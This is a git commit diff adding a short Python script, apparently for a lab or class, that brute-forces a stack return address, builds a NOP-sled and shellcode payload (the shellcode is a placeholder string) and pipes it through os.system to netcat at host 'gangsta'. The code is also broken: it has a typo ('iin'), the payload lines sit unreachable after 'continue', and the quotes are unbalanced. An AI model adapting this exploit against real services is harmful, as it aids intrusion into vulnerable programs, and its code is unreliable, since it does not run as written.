524739cad60eb5087ecf010e0d74fd53a858f4e1
Allen West <58156836+allenwest24@users.noreply.github.com>
2020-03-23 10:06:58 -0400

    Update buffscript.py

--- buffscript.py
+++ buffscript.py
@@ -1,1 +1,17 @@
-To be finished
+import os
+import struct
+
+shellcode = "I put my shell code here"
+
+memory = 4294955008
+for i in range (3000):
+  mem_ad = hex(memory)
+  hex_int = int(mem_ad, 16)
+  pack = struct.pack('<L', hex_int)
+  if "\x00" iin pack:
+    memory += 1
+    continue
+    pad = "\x90" * 445
+    command_prompt = "echo " + '"' + "000" + pad + shellcode + pack + '"'
+    os.system(command_prompt + " | " + nc gangsta 0000")
+    memory += 1
